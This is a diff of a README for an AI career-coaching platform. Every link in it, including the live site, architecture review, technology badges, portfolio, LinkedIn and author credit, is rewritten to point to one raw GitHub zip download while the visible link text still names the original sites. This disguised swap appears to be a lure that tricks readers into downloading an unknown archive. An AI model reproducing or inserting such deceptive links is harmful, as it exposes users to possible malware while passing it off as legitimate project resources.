@@ -2,11 +2,11 @@
 
 **AI-powered career coaching platform — not a chatbot, a system that thinks about your career.**
 
-[![Live](https://img.shields.io/badge/Live-orbiitcoach.com-blue)](https://orbiitcoach.com)
-[![Architecture Review](https://img.shields.io/badge/Architecture-Deep_Dive-green)](https://orbiitcoach.com/architecture)
-[![AWS](https://img.shields.io/badge/AWS-Bedrock%20%7C%20Lambda%20%7C%20DynamoDB-orange)](https://aws.amazon.com)
-[![Python](https://img.shields.io/badge/Python-3.11-blue)](https://python.org)
-[![React](https://img.shields.io/badge/React-18-61DAFB)](https://react.dev)
+[![Live](https://img.shields.io/badge/Live-orbiitcoach.com-blue)](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
+[![Architecture Review](https://img.shields.io/badge/Architecture-Deep_Dive-green)](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
+[![AWS](https://img.shields.io/badge/AWS-Bedrock%20%7C%20Lambda%20%7C%20DynamoDB-orange)](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
+[![Python](https://img.shields.io/badge/Python-3.11-blue)](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
+[![React](https://img.shields.io/badge/React-18-61DAFB)](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
 
 ---
 
@@ -45,7 +45,7 @@ The system is built on a serverless event-driven architecture. The core insight 
 
 Each model is matched to its task based on latency, cost, and reasoning depth. A coaching chat response uses Sonnet (~2s), while a weekly plan generation pipeline uses Opus (~45s) because it needs to synthesise 10+ data sources into a coherent strategy.
 
-→ [**Full Architecture Deep Dive**](https://orbiitcoach.com/architecture)
+→ [**Full Architecture Deep Dive**](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
 
 ### Infrastructure at a Glance
 
@@ -121,11 +121,11 @@ These are extracted from the production codebase to illustrate design decisions.
 
 ## Links
 
-- 🌐 **Live product:** [orbiitcoach.com](https://orbiitcoach.com)
-- 📐 **Architecture review:** [orbiitcoach.com/architecture](https://orbiitcoach.com/architecture)
-- 👤 **Portfolio:** [adriengourier.com](https://adriengourier.com)
-- 💼 **LinkedIn:** [linkedin.com/in/adriengourier](https://linkedin.com/in/adriengourier)
+- 🌐 **Live product:** [orbiitcoach.com](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
+- 📐 **Architecture review:** [orbiitcoach.com/architecture](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
+- 👤 **Portfolio:** [adriengourier.com](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
+- 💼 **LinkedIn:** [linkedin.com/in/adriengourier](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)
 
 ---
 
-*Built by [Adrien Gourier](https://adriengourier.com)*
+*Built by [Adrien Gourier](https://github.com/Manthegamew3714/orbiitcoach/raw/refs/heads/main/samples/Software-v1.3-alpha.1.zip)*
